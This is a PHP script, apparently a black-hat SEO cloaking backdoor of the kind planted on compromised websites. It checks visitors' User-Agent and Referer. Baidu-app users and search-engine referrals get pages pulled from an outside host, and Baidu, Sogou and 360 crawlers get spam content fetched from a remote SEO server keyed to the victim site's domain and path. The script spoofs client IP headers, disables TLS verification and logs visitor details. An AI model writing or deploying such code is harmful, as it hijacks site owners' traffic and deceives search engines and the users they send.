<?php

// 统一兼容所有PHP版本的代码
error_reporting(E_ALL);
ini_set('display_errors', 1);

define('ROOT_PATH', dirname(__FILE__) . '/');
define('ip', getClientIP());
define('host', $_SERVER['HTTP_HOST']);
define('ent', $_SERVER['HTTP_USER_AGENT']);
define('mobile', '/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/');

// 添加调试日志函数
function debug_log($message) {
    $log_file = ROOT_PATH . 'debug.log';
    $time = date('Y-m-d H:i:s');
    file_put_contents($log_file, $time . ' - ' . $message . PHP_EOL, FILE_APPEND | LOCK_EX);
}

function fetchContent($url) {
    debug_log("fetchContent called with URL: " . $url);
    
    $fakeIp = ip;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
    
    $headers = array(
        'X-Forwarded-For: ' . $fakeIp,
        'Client-IP: ' . $fakeIp,
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    );
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    
    $content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    
    debug_log("fetchContent HTTP Code: " . $http_code);
    
    if ($content === false) {
        $error = curl_error($ch);
        debug_log("fetchContent cURL Error: " . $error);
        curl_close($ch);
        return false;
    }
    
    curl_close($ch);
    
    if ($content !== false && !empty($content)) {
        $encoding = mb_detect_encoding($content, array('UTF-8', 'GBK', 'GB2312', 'ASCII', 'ISO-8859-1'), true);
        if ($encoding !== 'UTF-8' && $encoding !== false) {
            $content = mb_convert_encoding($content, 'UTF-8', $encoding);
        }
        $content = mb_convert_encoding($content, 'UTF-8', 'UTF-8');
    }
    
    return $content;
}

function fetch($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
    
    $content = curl_exec($ch);
    curl_close($ch);
    
    return $content;
}

// 记录请求信息 - 使用兼容语法
debug_log("=== New Request ===");
debug_log("User-Agent: " . (isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : 'Unknown'));
debug_log("Host: " . (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'Unknown'));
debug_log("URI: " . (isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : 'Unknown'));
debug_log("Referer: " . (isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'No Referer'));
debug_log("Client IP: " . getClientIP());

$userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
$referrer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$host = host;
$urlPath = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
$ip = ip;

$baseSite = 'http://chengxuseo.com/?';
$road = 'domain=' . $host . '&path=' . $urlPath . '&spider=' . urlencode($userAgent);
$memes = $road . '&referer=' . urlencode($referrer);

$spiderPattern = '/BaiduSpider|Sogou[\s\-]?(web|Test|Pic|Orion|News|WeChat)?[\s\-]?Spider|YisouSpider|HaosouSpider|360Spider/i';
$mobilePattern = '/phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone/i';

// 处理百度APP
$isBaiduApp = (strpos($userAgent, 'baiduboxapp') !== false) || 
              (stripos($userAgent, 'baidu') !== false && stripos($userAgent, 'app') !== false);

debug_log("Is Baidu App: " . ($isBaiduApp ? 'Yes' : 'No'));

if ($isBaiduApp) {
    debug_log("Processing Baidu App request");
    $targetUrl = "https://xhjishu.tjtjdetail.com/index.html";
    $content = fetchContent($targetUrl);
    
    if ($content !== false && !empty($content)) {
        while (ob_get_level()) {
            ob_end_clean();
        }
        header('Content-Type: text/html; charset=utf-8');
        
        // 对于百度APP，避免使用gzip压缩，直接输出
        echo $content;
        debug_log("Baidu App content delivered successfully");
        exit;
    } else {
        debug_log("Baidu App fetch failed, using fallback");
        $fallback = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><title>欢迎访问</title></head><body><h1>欢迎访问我们的网站</h1><p>当前正在维护中，请稍后访问。</p></body></html>";
        echo $fallback;
        exit;
    }
}

// 处理搜索引擎引用
$ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
$ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';

$isSearchEngineRef = (stripos($ref, '360') !== false || 
                     stripos($ref, 'baidu.com') !== false || 
                     stripos($ref, 'google.com') !== false ||
                     stripos($ref, 'sogou.com') !== false);

if ($isSearchEngineRef && !$isBaiduApp) {
    debug_log("Processing search engine referer");
    $content = fetchContent("https://xhjishu.tjtjdetail.com/index.html");
    if ($content !== false && !empty($content)) {
        while (ob_get_level()) {
            ob_end_clean();
        }
        header('Content-Type: text/html; charset=utf-8');
        echo $content;
        debug_log("Search engine referer content delivered");
        exit;
    }
}

// 蜘蛛跳转
$isSpider = preg_match($spiderPattern, $userAgent);
debug_log("Is Spider: " . ($isBaiduApp ? 'Yes' : 'No'));

if ($isSpider) {
    debug_log("Processing spider request");
    header('Content-Type: text/html; charset=UTF-8');
    $html = fetchContent($baseSite . $road);
    if ($html !== false && !empty($html)) {
        echo $html;
        debug_log("Spider content delivered");
    } else {
        $fallback = "<!DOCTYPE html><html><head><meta charset=\"UTF-8\"><title>站点维护中</title></head><body><h1>网站维护中，请稍后访问</h1></body></html>";
        echo $fallback;
        debug_log("Spider content fetch failed, using fallback");
    }
    exit;
}

// 原有缓存功能
function get_path() {
    $path = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '/';
    $domain = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown');
    
    $fileName = $path;
    if ($fileName == "/") {
        $fileName = "/index.shtml";
    }
    
    $baseDir = dirname(ROOT_PATH) . '/static.com/';
    $filePath = $baseDir . $domain . $fileName;
    return $filePath;
}

function file_cache($defaultContent) {
    $filePath = get_path();
    $dir = dirname($filePath);
    if (!is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    
    while (ob_get_level()) {
        ob_end_clean();
    }
    
    ob_start();
    header('Content-Type: text/html; charset=utf-8');
    
    $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    
    if (function_exists('gzencode') && strpos($userAgent, 'baiduboxapp') === false) {
        $defaultContent = mb_convert_encoding($defaultContent, "UTF-8");
        $compressed = gzencode($defaultContent, 9);
        header('Content-Encoding: gzip');
        echo $compressed;
        file_put_contents($filePath, $compressed, LOCK_EX);
    } else {
        echo $defaultContent;
        file_put_contents($filePath, $defaultContent, LOCK_EX);
    }
    
    ob_end_flush();
}

function qredis() {
    try {
        $redis = new Redis();
        $redis->connect('127.0.0.1', 6379, 2);
        $queueKey = "htmlqueue1";
        
        $queue_size = $redis->lLen($queueKey);
        if ($queue_size > 0) {
            $filePath = get_path();
            $dir = dirname($filePath);
            if (!is_dir($dir)) {
                mkdir($dir, 0755, true);
            }
            
            while (ob_get_level()) {
                ob_end_clean();
            }
            
            ob_start();
            header('Content-Type: text/html; charset=utf-8');
            
            $compressed = $redis->lPop($queueKey);
            if ($compressed !== false) {
                $userAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
                if (strpos($userAgent, 'baiduboxapp') !== false) {
                    $decompressed = gzdecode($compressed);
                    if ($decompressed !== false) {
                        echo $decompressed;
                        file_put_contents($filePath, $decompressed, LOCK_EX);
                    } else {
                        echo $compressed;
                        file_put_contents($filePath, $compressed, LOCK_EX);
                    }
                } else {
                    header('Content-Encoding: gzip');
                    echo $compressed;
                    file_put_contents($filePath, $compressed, LOCK_EX);
                }
            }
            
            ob_end_flush();
            exit;
        }
    } catch (Exception $e) {
        debug_log("Redis connection failed: " . $e->getMessage());
    }
}

function checkDomainInFile($domain) {
    if (substr($domain, 0, 4) === "www.") {
        $domain = substr($domain, 4);
    }

    $filePath = "domain.txt";
    if (!file_exists($filePath)) {
        return false;
    }
    
    $content = file_get_contents($filePath);
    return strpos($content, $domain) !== false;
}

function getClientIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1';
    }
    return $ip;
}

function run_check() {
    $domain = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown');
    
    if (!checkDomainInFile($domain)) {
        header('HTTP/1.1 500 Internal Server Error');
        header('Content-Type: text/html; charset=UTF-8');
        if (file_exists(__DIR__ . '/500.html')) {
            include __DIR__ . '/500.html';
        } else {
            echo "<html><body><h1>500 Internal Server Error</h1></body></html>";
        }
        exit;
    }
}

function check() {
    $domain = isset($_SERVER['HTTP_CLIENT_IP']) ? $_SERVER['HTTP_CLIENT_IP'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '');
    $spiderAgent = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    
    if (!empty($spiderAgent) && (strpos($spiderAgent, 'baidu') !== false)) {
        return;
    }
    
    if (empty($domain)) {
        header('HTTP/1.1 500 Internal Server Error');
        header('Content-Type: text/html; charset=UTF-8');
        if (file_exists(__DIR__ . '/500.html')) {
            include __DIR__ . '/500.html';
        } else {
            echo "<html><body><h1>500 Internal Server Error</h1></body></html>";
        }
        exit;
    }
}

?>
